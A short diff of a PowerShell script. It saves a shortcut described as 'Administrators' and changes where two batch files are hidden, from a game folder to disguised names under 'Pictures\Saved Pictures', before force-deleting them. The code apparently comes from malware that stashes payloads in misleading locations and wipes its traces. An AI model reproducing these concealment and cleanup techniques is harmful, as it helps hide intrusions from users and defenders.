@@ -63,8 +63,8 @@ $stage.Description = "Administrators"
 $stage.WorkingDirectory = "c:\"
 $stage.Save()
 
-$bbt1 = $env:userprofile + "\Documents\StarCraft\Characters\lee.bat"
-$bbt2 = $env:userprofile + "\Documents\StarCraft\Characters\spc.bat"
+$bbt1 = $env:userprofile + "\Pictures\Saved Pictures\ini.bat"
+$bbt2 = $env:userprofile + "\Pictures\Saved Pictures\pic.bat"
 Remove-Item $bbt1 -force
 Remove-Item $bbt2 -force
 
